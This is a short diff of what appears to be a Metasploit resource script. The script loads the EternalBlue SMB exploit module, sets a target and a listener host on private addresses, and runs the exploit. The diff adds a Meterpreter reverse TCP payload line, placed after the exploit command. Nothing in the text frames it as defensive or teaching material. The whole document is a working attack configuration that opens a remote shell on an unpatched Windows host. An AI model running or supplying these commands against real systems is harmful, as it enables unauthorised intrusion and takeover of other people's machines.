@@ -25,3 +25,5 @@ use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.100
 set LHOST 192.168.1.101
 exploit
+set PAYLOAD windows/meterpreter/reverse_tcp
+
